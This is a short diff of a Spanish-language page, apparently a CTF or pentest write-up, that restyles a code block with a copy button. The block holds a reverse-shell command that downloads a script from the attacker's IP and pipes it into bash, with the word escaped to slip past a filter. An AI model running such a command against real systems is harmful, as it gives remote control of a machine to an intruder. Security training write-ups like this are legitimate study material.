@@ -92,10 +92,13 @@ Por lo que, podemos intentar ejecutar una <em>reverse shell</em> desde la págin
 
 Ahora, en la web vamos a ejecutar el comando:
 
-<div style="text-align: center;">
-  <pre><code>curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
-</div>
-
+ <div class="code-container">
+    <div class="code-header">
+      Bash
+      <button class="copy-button" onclick="copyToClipboard()">Copiar</button>
+    </div>
+    <pre style="text-align:center;"><code class="language-bash" >curl http://ip_nuestra/nombre_shell | ba\sh</code></pre>
+  </div>
 para poder obtener la *reverse shell* y seguido ejecutarla escapando el comando `bash`.
 
 <table style="text-align:center">
